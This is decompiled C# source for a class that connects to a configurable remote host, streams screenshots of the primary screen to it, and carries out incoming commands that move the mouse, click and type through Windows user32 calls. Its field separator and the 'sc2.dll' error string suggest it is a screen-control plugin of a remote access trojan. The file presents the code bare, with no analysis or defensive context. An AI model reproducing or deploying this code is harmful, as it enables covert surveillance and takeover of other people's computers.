using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace sc2
{
	// Token: 0x02000002 RID: 2
	public class A
	{
		// Token: 0x06000002 RID: 2 RVA: 0x0000205C File Offset: 0x0000025C
		public A()
		{
			this.OFF = false;
			this.C = new TcpClient();
			this.OSK = "";
			this.isrun = false;
			this.Uoff = false;
			this.bmb = new List<byte[]>();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000209C File Offset: 0x0000029C
		public void Sendb(byte[] b)
		{
			try
			{
				TcpClient c = this.C;
				lock (c)
				{
					MemoryStream memoryStream = new MemoryStream();
					string text = Conversions.ToString(b.Length) + "\0";
					byte[] array = A.SB(ref text);
					memoryStream.Write(array, 0, array.Length);
					memoryStream.Write(b, 0, b.Length);
					this.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					memoryStream.Dispose();
				}
			}
			catch (Exception ex)
			{
				this.OFF = true;
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002150 File Offset: 0x00000350
		public void Send(string S)
		{
			this.Sendb(A.SB(ref S));
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002160 File Offset: 0x00000360
		public static byte[] SB(ref string S)
		{
			return Encoding.Default.GetBytes(S);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000217C File Offset: 0x0000037C
		public string BS(ref byte[] B)
		{
			return Encoding.Default.GetString(B);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002198 File Offset: 0x00000398
		public void Start()
		{
			Thread thread = new Thread(new ThreadStart(this.RC));
			thread.Start();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000021C0 File Offset: 0x000003C0
		public void RC()
		{
			MemoryStream memoryStream = new MemoryStream();
			long num = -1L;
			byte[] array = new byte[1];
			checked
			{
				try
				{
					this.C.Connect(this.H, this.P);
					Size size = Screen.PrimaryScreen.Bounds.Size;
					string text = string.Concat(new string[]
					{
						"sc~",
						A.Y,
						this.OSK,
						A.Y,
						Conversions.ToString(size.Width),
						A.Y,
						Conversions.ToString(size.Height)
					});
					this.Send(text);
					Thread thread = new Thread(new ThreadStart(this.fr), 1);
					thread.Start();
					IL_C1:
					while (!this.OFF)
					{
						if (this.C.Available < 1)
						{
							this.C.Client.Poll(-1, SelectMode.SelectRead);
						}
						while (this.C.Available != 0)
						{
							if (num == -1L)
							{
								string text2 = "";
								for (;;)
								{
									int num2 = this.C.GetStream().ReadByte();
									if (num2 == -1)
									{
										goto Block_10;
									}
									if (num2 == 0)
									{
										break;
									}
									text2 += Conversions.ToString(Strings.ChrW(num2));
								}
								num = Conversions.ToLong(text2);
								if (num == 0L)
								{
									this.Send("");
									num = -1L;
								}
								if (this.C.Available > 0)
								{
									continue;
								}
								goto IL_C1;
								Block_10:
								break;
							}
							array = new byte[this.C.Available + 1];
							long num3 = num - memoryStream.Length;
							if (unchecked((long)array.Length) > num3)
							{
								array = new byte[(int)(num3 - 1L) + 1];
							}
							int num4 = this.C.Client.Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, num4);
							if (memoryStream.Length == num)
							{
								num = -1L;
								this.ind(memoryStream.ToArray());
								memoryStream.Dispose();
								memoryStream = new MemoryStream();
							}
							goto IL_C1;
						}
						break;
					}
				}
				catch (Exception ex)
				{
				}
				this.OFF = true;
				this.Uoff = true;
				try
				{
					this.C.Client.Disconnect(false);
				}
				catch (Exception ex2)
				{
				}
				try
				{
					this.C.Close();
				}
				catch (Exception ex3)
				{
				}
				try
				{
					memoryStream.Dispose();
				}
				catch (Exception ex4)
				{
				}
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000024A0 File Offset: 0x000006A0
		public void ind(byte[] b)
		{
			string text = this.BS(ref b);
			string[] array = Strings.Split(text, A.Y, -1, CompareMethod.Binary);
			try
			{
				string text2 = array[0];
				if (Operators.CompareString(text2, "!", false) == 0)
				{
					lock (this)
					{
						this.Uoff = true;
						while (this.isrun)
						{
							Thread.Sleep(1);
						}
						this.Uoff = false;
						this.isrun = true;
						Thread thread = new Thread(new ParameterizedThreadStart(this.ud));
						Thread thread2 = thread;
						object[] array2 = new object[3];
						object[] array3 = array2;
						int num = 0;
						Size size = new Size(Conversions.ToInteger(Strings.Split(array[2], "x", -1, CompareMethod.Binary)[0]), Conversions.ToInteger(Strings.Split(array[2], "x", -1, CompareMethod.Binary)[1]));
						array3[num] = size;
						array2[1] = array[1];
						array2[2] = array[3];
						thread2.Start(array2);
						return;
					}
				}
				if (Operators.CompareString(text2, "!!", false) == 0)
				{
					lock (this)
					{
						this.Uoff = true;
						while (this.isrun)
						{
							Thread.Sleep(1);
						}
						return;
					}
				}
				if (Operators.CompareString(text2, "@", false) == 0)
				{
					int num2 = Conversions.ToInteger(array[3]);
					if (num2 == 2048)
					{
						A.mouse_event(Conversions.ToInteger(array[3]), 0, 0, Conversions.ToInteger(array[1]), 1);
					}
					else
					{
						Point point = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						Cursor.Position = point;
						A.mouse_event(Conversions.ToInteger(array[3]), 0, 0, 0, 0);
					}
				}
				else if (Operators.CompareString(text2, "#", false) == 0)
				{
					A.keybd_event(Conversions.ToByte(array[2]), checked((byte)A.MapVirtualKey(Conversions.ToInteger(array[2]), 0)), Conversions.ToInteger(array[1]), 0);
				}
				else if (Operators.CompareString(text2, "$", false) == 0)
				{
					this.C.Close();
				}
			}
			catch (Exception ex)
			{
				this.Send(string.Concat(new string[]
				{
					"ER",
					A.Y,
					array[0],
					A.Y,
					ex.Message
				}));
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002734 File Offset: 0x00000934
		public void fr()
		{
			checked
			{
				while (!this.OFF)
				{
					Thread.Sleep(1);
					if ((this.bmb.Count > 0) & this.isrun)
					{
						TcpClient c = this.C;
						lock (c)
						{
							byte[] array = null;
							List<byte[]> list = this.bmb;
							lock (list)
							{
								while (this.bmb.Count != 0)
								{
									array = this.bmb[0];
									this.bmb.RemoveAt(0);
								}
							}
							if (!this.OFF)
							{
								try
								{
									MemoryStream memoryStream = new MemoryStream();
									string text = Conversions.ToString(array.Length) + "\0";
									byte[] array2 = A.SB(ref text);
									memoryStream.Write(array2, 0, array2.Length);
									memoryStream.Write(array, 0, array.Length);
									this.C.Client.SendBufferSize = (int)Math.Round(unchecked((double)memoryStream.Length * 2.5));
									this.C.Client.Poll(-1, SelectMode.SelectWrite);
									this.C.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
								}
								catch (Exception ex)
								{
									this.OFF = true;
									break;
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000028B0 File Offset: 0x00000AB0
		public void ud(object xa)
		{
			object obj = NewLateBinding.LateIndexGet(xa, new object[] { 0 }, null);
			Size size2 = Size.Empty;
			Size size = ((obj != null) ? ((Size)obj) : size2);
			string text = Conversions.ToString(NewLateBinding.LateIndexGet(xa, new object[] { 1 }, null));
			int num = Conversions.ToInteger(NewLateBinding.LateIndexGet(xa, new object[] { 2 }, null));
			capture capture = new capture(size);
			while (!(this.Uoff | this.OFF))
			{
				Thread.Sleep(1);
				if (this.bmb.Count == 0)
				{
					try
					{
						byte[] array = capture.Capture();
						if (array != null)
						{
							MemoryStream memoryStream = new MemoryStream();
							string text2 = "scPK" + A.Y + text + A.Y;
							memoryStream.Write(A.SB(ref text2), 0, text2.Length);
							memoryStream.Write(array, 0, array.Length);
							List<byte[]> list = this.bmb;
							lock (list)
							{
								this.bmb.Add(memoryStream.ToArray());
							}
							memoryStream.Dispose();
						}
					}
					catch (Exception ex)
					{
						this.Send(string.Concat(new string[]
						{
							"ER",
							A.Y,
							"sc2.dll",
							A.Y,
							ex.Message
						}));
						Thread.Sleep(2000);
					}
				}
			}
			List<byte[]> list2 = this.bmb;
			lock (list2)
			{
				this.bmb.Clear();
			}
			this.isrun = false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002A98 File Offset: 0x00000C98
		public string getMD5Hash(byte[] B)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			B = md5CryptoServiceProvider.ComputeHash(B);
			string text = "";
			foreach (byte b in B)
			{
				text += b.ToString("x2");
			}
			return text;
		}

		// Token: 0x0600000D RID: 13
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

		// Token: 0x0600000E RID: 14
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "MapVirtualKeyA", ExactSpelling = true, SetLastError = true)]
		private static extern int MapVirtualKey(int wCode, int wMapType);

		// Token: 0x0600000F RID: 15
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

		// Token: 0x04000001 RID: 1
		public string H;

		// Token: 0x04000002 RID: 2
		public int P;

		// Token: 0x04000003 RID: 3
		public bool OFF;

		// Token: 0x04000004 RID: 4
		public static string Y = "|'|'|";

		// Token: 0x04000005 RID: 5
		public TcpClient C;

		// Token: 0x04000006 RID: 6
		public string OSK;

		// Token: 0x04000007 RID: 7
		public bool isrun;

		// Token: 0x04000008 RID: 8
		public bool Uoff;

		// Token: 0x04000009 RID: 9
		public List<byte[]> bmb;
	}
}
